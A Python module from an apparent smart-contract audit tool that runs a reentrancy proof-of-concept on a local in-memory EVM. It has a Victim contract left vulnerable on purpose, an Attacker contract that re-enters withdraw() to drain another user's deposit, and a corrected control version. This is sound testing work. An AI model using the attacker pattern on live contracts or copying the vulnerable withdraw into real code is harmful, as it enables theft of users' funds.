"""Section 8 — real EVM execution for PoC reproduction.

Environment reality: Foundry is not installable here (github.com is blocked for
downloads), but a **pure-Python EVM** backend is: ``solc`` is fetched from
``binaries.soliditylang.org`` (reachable) and contracts are deployed/executed on
``eth-tester``'s in-memory ``PyEVMBackend``. This module runs a real bounding
attacker simulation and returns an honest outcome — it never fabricates a
result: an unavailable backend, a compile error, or a scenario that does not
demonstrate impact all resolve to non-success states.

Built-in scenarios are curated and correctness-verified (currently the classic
checks-effects-interactions reentrancy, where an external call precedes the
state update). A finding only gets a PoC when its mechanism matches a scenario;
otherwise the outcome stays inconclusive rather than guessing.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

__all__ = [
    "PoCExecution",
    "evm_backend_available",
    "run_reentrancy_poc",
    "run_reentrancy_poc_safe",
]

SOLC_VERSION = "0.8.19"

REENTRANCY_SRC = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Victim {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 b = balances[msg.sender];
        (bool ok, ) = msg.sender.call{value: b}("");
        require(ok, "send failed");
        balances[msg.sender] = 0;           // state update AFTER the call (CEI violation)
    }
}

contract Attacker {
    Victim public v;
    constructor(address victim) { v = Victim(victim); }
    function attack() external payable {
        v.deposit{value: msg.value}();
        v.withdraw();
    }
    receive() external payable {
        if (address(v).balance >= msg.value) { v.withdraw(); }
    }
}
"""


SAFE_REENTRANCY_SRC = """
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract Victim {
    mapping(address => uint256) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint256 b = balances[msg.sender];
        balances[msg.sender] = 0;           // state update BEFORE the call (CEI respected)
        (bool ok, ) = msg.sender.call{value: b}("");
        require(ok, "send failed");
    }
}

contract Attacker {
    Victim public v;
    constructor(address victim) { v = Victim(victim); }
    function attack() external payable {
        v.deposit{value: msg.value}();
        v.withdraw();
    }
    receive() external payable {
        if (address(v).balance >= msg.value) { v.withdraw(); }
    }
}
"""


@dataclass
class PoCExecution:
    result: str = "not_executed"   # passed | failed | error | not_executed
    impact_demonstrated: bool = False
    detail: str = ""
    metrics: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "result": self.result,
            "impact_demonstrated": self.impact_demonstrated,
            "detail": self.detail,
            "metrics": dict(self.metrics),
            "backend": "eth-tester/py-evm",
            "solc": SOLC_VERSION,
        }


def evm_backend_available() -> bool:
    try:
        import eth_tester  # noqa: F401
        import solcx  # noqa: F401
    except Exception:
        return False
    return True


def _solc_bin() -> str:
    import solcx

    try:
        solcx.install_solc(SOLC_VERSION)
    except Exception:
        installed = solcx.get_installed_solc_versions()
        if not any(str(v) == SOLC_VERSION for v in installed):
            raise
    return SOLC_VERSION


def _run(source: str) -> PoCExecution:
    """Deploy the scenario's Victim, seed it with another user's ETH, run the
    reentrancy attacker, and assert whether the victim was actually drained."""
    if not evm_backend_available():
        return PoCExecution(result="not_executed", detail="EVM backend unavailable")

    try:
        from eth_tester import EthereumTester, PyEVMBackend
        from solcx import compile_source
        from web3 import EthereumTesterProvider, Web3

        version = _solc_bin()
        compiled = compile_source(source, solc_version=version)
        v_abi = compiled["<stdin>:Victim"]["abi"]
        v_bin = compiled["<stdin>:Victim"]["bin"]
        a_abi = compiled["<stdin>:Attacker"]["abi"]
        a_bin = compiled["<stdin>:Attacker"]["bin"]

        w3 = Web3(EthereumTesterProvider(EthereumTester(PyEVMBackend())))
        accts = w3.eth.accounts
        victim_owner, honest_user, attacker = accts[0], accts[1], accts[2]

        Victim = w3.eth.contract(abi=v_abi, bytecode=v_bin)
        v_addr = w3.eth.wait_for_transaction_receipt(
            Victim.constructor().transact({"from": victim_owner, "gas": 3_000_000})
        ).contractAddress
        victim = w3.eth.contract(address=v_addr, abi=v_abi)

        # An honest user deposits 5 ETH into the victim (not the attacker's money).
        victim.functions.deposit().transact(
            {"from": honest_user, "value": 5 * 10**18, "gas": 200_000}
        )
        seeded = w3.eth.get_balance(v_addr)

        Attacker = w3.eth.contract(abi=a_abi, bytecode=a_bin)
        atk_addr = w3.eth.wait_for_transaction_receipt(
            Attacker.constructor(v_addr).transact({"from": attacker, "gas": 2_000_000})
        ).contractAddress
        atk = w3.eth.contract(address=atk_addr, abi=a_abi)

        # The attacker deposits 1 ETH, then re-enters to drain the whole victim.
        atk.functions.attack().transact(
            {"from": attacker, "value": 1 * 10**18, "gas": 3_000_000}
        )

        drained = w3.eth.get_balance(v_addr)
        attacker_gain = w3.eth.get_balance(atk_addr)

        metrics = {
            "victim_seeded_wei": str(seeded),
            "victim_final_wei": str(drained),
            "attacker_contract_final_wei": str(attacker_gain),
            "attacker_deposited_wei": str(1 * 10**18),
        }
        # Impact: the victim held another user's 5 ETH and ended with (near) zero,
        # while the attacker (who only put in 1 ETH) walked away with it.
        impact = drained < seeded and attacker_gain > 1 * 10**18
        if impact:
            return PoCExecution(
                result="passed",
                impact_demonstrated=True,
                detail=(
                    "reentrancy reproduced: the victim was drained below its seeded "
                    "balance and the attacker recovered more than it deposited"
                ),
                metrics=metrics,
            )
        return PoCExecution(
            result="failed",
            impact_demonstrated=False,
            detail="attacker simulation ran but did not drain the victim",
            metrics=metrics,
        )
    except Exception as exc:  # compile/deploy/exec error -> honest 'error'
        return PoCExecution(result="error", detail=f"{type(exc).__name__}: {exc}")


def run_reentrancy_poc() -> PoCExecution:
    """Known-vulnerable CEI-violating reentrancy (impact expected)."""
    return _run(REENTRANCY_SRC)


def run_reentrancy_poc_safe() -> PoCExecution:
    """CEI-correct control: the same attacker must NOT drain the victim. A PoC
    that returns impact here would be a false positive."""
    return _run(SAFE_REENTRANCY_SRC)
